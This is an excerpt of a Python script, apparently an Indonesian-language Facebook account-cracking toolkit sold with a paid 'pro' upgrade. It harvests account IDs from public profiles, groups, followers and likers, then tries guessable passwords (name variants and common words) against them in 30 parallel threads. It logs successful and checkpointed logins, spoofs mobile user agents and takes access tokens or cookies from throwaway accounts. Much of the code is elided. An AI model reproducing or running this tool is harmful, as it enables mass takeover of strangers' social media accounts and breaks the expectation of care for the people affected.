...
os.system("clear")
print("\x1b[1;97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲  Only Admin Chekout Api Key 081283099471 ❳═>")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
...
Password = "MSRXXIYNNHLLLEE" # --> Data Req Api key --> open_kt(life)("MSRXXIYNNHLLLEE")
...
ugen3=['Mozilla/5.0 (Linux; Android 9; VKY-L09; HMSCore 6.3.0.331; GMSCore 22.06.18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36']
ugen2=['Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
...
def banner():
	clear()
	print("""	
         \x1b[1;97m____ _  _ _    _   _    ___  ____ ____ _  _  --> NICKEY XD 
         \x1b[1;97m|  | |\ | |     \_/     |__] |__/ |___ |\/|  --> OVER POWER
         \x1b[1;97m|__| | \| |___   |      |    |  \ |___ |  |  --> \033[32mONLY PREMIUM
                     \n\033[32mKEY YOUR -->  GYHSJ********HSHSH --> Licensi Anda                                                                               
 """)
#-------------------[Maintenance Server]----------------------
#def kata_buat_server():
	#for nnn in list([C+"😭"+K+"•••"+Q, K+"•"+C+"😡"+K+"••"+Q, K+"••"+C+"😭"+K+"•"+Q, K+"•••"+C+"😡"+Q]):
		#for nnnn in list(["\033[93mMaaf Server Sedang, Maintenance", "Harap tunggu beberapa hari", "Lapor admin untuk server segera di per baikan"]):
			#sys.stdout.write(f'\r {nnn} -> {M}{nnnn}{Q}        '),
			#sys.stdout.flush()
			#time.sleep(1)
	#kata_buat_server()
#von = requests.get("https://pastebin.com/raw/4BnHKf4c").text.strip()
#if "ON" in von:pass
#else:
	#os.system("git pull;clear")
	#print(f"\x1b[1;97m[•] Maaf Script Sedang Maintenance, Harap Tunggu Hingga Selesai")
	#print(f'\x1b[1;97m[•] Tekan CTRL + Z Untuk Ezit !')
	#kata_buat_server()
...
def login_lagi334():
	...
	cetak(nel(sky2,title='[bold green] LOGIN[/bold green]'))
	pil=input('--> Pilih Fitur Login : ')
	if pil in ['1','01']:
		cik='--> Masukan Token Eaab Kalian Untuk Login Ke Dalam Tools nya\nJangan Lupa Gunakan Akun Tumbal'
		...
		try:
			...
			sue = '--> Selamat Token Anda Valid , Jalankan Lagi Scripnya Dan Masukan Lagi Api key nya'
			suu = mark(sue, style='green')
			sol().print(suu, style='green')
			exit()
		except KeyError:
			sue = '--> Token Anda Tidak Terdaftar / Cek Akun Anda'
       ...
       # tampilan_menu()
			...
			cik='--> Selamat Cookie Anda Valid / Jalankan Lagi Scrip nya'
		...
		try:
			cik='--> Login Only Token Free'
			cik2=mark(cik ,style='white')
			sol().print(cik2)
			cookie=input("--> Sory Fitur Ini sedang Tidak baik baik saja --> Enter ")
			os.system("https://wa.me/6282151858918")
...
#	banner()
	#sg = '✓ SAVAGE✓'
#	print("""%s Tools By Acil X code🔸"""%(h))
	#print("""%s X CODE TEAM® 🔸 ' COPYRIGHT YEAR' 2022 🔸 """%(h))
#	fx = mark(sg, style='green')
	#sol().print(fx)
	os.system("clear")
	print(h+''+h+'-->'+h+' User  --> '+str(my_name))
	print(h+''+h+'-->'+h+' Facebook Id     --> '+str(my_id))
	print(h+''+h+'-->'+h+' Date Id   --> '+str(birth))
	print(h+''+h+'-->'+h+' Location IP  --> '+str(sh['origin']))
	io = '[01] Crack Dari Public\n[02] Crack Dari Public (Massal)\n[03] Cek Hasil Crack\n[04] Chek Opsi Akun\n[05] Crack IDs Grub\n[06] Crack IDs Dari Follower\n[07] Crack Via Liker\n[08] Crack IDs Follower [Massal]\n[09] Dump IDs Target Game\n[10] Dump IDs Malaysia --> No Login\n[11] Cloning IDs India --> No Login\n[12] Cloning IDs Pakistan --> No Login\n[13] Creat 50 Akun New\n[14] Creat 100 Akun Gmail\n[15] Upgrade Ke Pro\n[00] Keluar'
	oi = nel(io, style='white')
	cetak(nel(oi, title='MENU TOOLKIT'))
	jh = input(h+''+h+'-->'+h+' Choose Number ? : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
...
def dump_publik():
	try:
		...
		exit()
	win = '# Crack Public Ids'
	win2 = mark(win, style='white')
	sol().print(win2)
	print(h+''+h+'-->'+h+' Crack Ids Facebook')
	pil = input(h+''+h+'-->'+h+' FACEBOOK IDs : ')
	try:
...
def pesan():
	...
	try:
		...
		if jumlah>5000:
			print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH MAKSIMAL 5000 ID')
			time.sleep(0.5)
			dump_follower()
...
# ========== memek ==========
def memek():
     print(' \n\n--> Untuk Melakukan Proses Upgrade Tools Anda Akan Di Arahkan Ke Admin')
     time.sleep(5.0)
     print('\n--> Hubungi Admin Di Nomor ini --> 082151858918')
     time.sleep(3.0)
     os.system("python main.py")				
...
# ==========pro =======]
def pro():
	 print(' Opssss Untuk Mengunakan Fitur ini Anda Harus Upgrade Terlebih Dahulu')
	 time.sleep(3.0)
	 os.system("python main.py")
	 os.system(2.0)
...
def beranda():
	print(' ')
	id = input('[•] Id Atau UserName Grup : ')
	...
	if berr2=='Masuk Facebook':
		print("Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	...
	if len(ang)==0:
		...
		print(x+'['+h+'•'+x+']  Anggota : '+str(ang[0]))
		print("\nUpgrade Ke pro untuk menikmati Hasil Nya")
		time.sleep(5.0)
		os.system("python main.py")
	 # exit()
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(h+''+h+'-->'+h+' TOTAL LIMIT ID [20]')
		try:
			jum = int(input(h+''+h+'-->'+h+' BERAPA ID : '))
		except ValueError:
			pesan = '# ID TIDAK DI TEMUKAN'
			pesan2 = mark(pesan, style='white')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
	...
	os.system("clear")
	sol().print(mark(sed, style='white'))
	ses=requests.Session()
	for userr in uid:
		try:
			...
			exit()
	tot = '# --> Ids Terkumpul --> %s IDs, '%(len(id))
	if len(id)==0:
...
def setting():
	...
	teks = '[01] Crack Ids Old (MANTAP)\n[02] Crack Ids New (OKE)\n[03] Crack Acak Ids (WORK)'
	tak = nel(teks, style='white')
	cetak(nel(tak, title='MENU CRACK'))
	hu = input(h+''+h+'-->'+h+' Choose Method : ')
	os.system("clear")
	if hu in ['1','01']:
		...
		sol().print(mark(ric, style='white'))
		exit()
	met = '# PROVIDER JARIGGAN'
	sol().print(mark(met, style='white'))
	ioz = '[01] --> Validate\n[02] --> Regular\n[03] --> Wifi Only --> Netgear\n[04] --> Wifi Only --> TP-Link\n[05] --> Wifi Only --> TrendNet\n[06] --> Wifi Only --> Synology\n[07] --> Only Date --> Tsel\n[08] --> Only Date --> XL\n[09] --> Only Date --> Indosat\n[10] --> Only Date --> Tri\n[11] --> Only Date --> Smartfren\n[12] --> Only Date --> All Provider\n[12] --> Only Date --> All Proxy\n[13] Only Data --> Full Speed'
	gess = nel(ioz, style='white')
	cetak(nel(gess, title='--> PILIH PROVIDER SESUAI KEBUTUHAN'))
	hc = input(h+''+h+'-->'+h+' Choose : ')
	if hc in ['1','01']:
	...
	aplik = input(h+''+h+'-->'+h+' Tampilkan Opsi Apk ? --> Menguras Paket (y/t) : ')
	if aplik in ['y','Y']:
	#os.system("clear")
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	#osk = input(x+''+p+'-->'+x+' Tampilkan Opsi Checkpoint ? --> Not Recommended  (y/t) : ')
	#if osk in ['y','Y']:
#	os.system("clear")
		#oprek.append('ya')
	#else:
...
def passwrd():
	...
	cetak(nel(krek, title='RUN TOOLS'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['1234567','sayang','kontol','12345','sayangku','anjing','bangsad']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s<<•>>%s/%s OK:%s CP:0'%(x,loop,len(id2),ok));sys.stdout.flush()
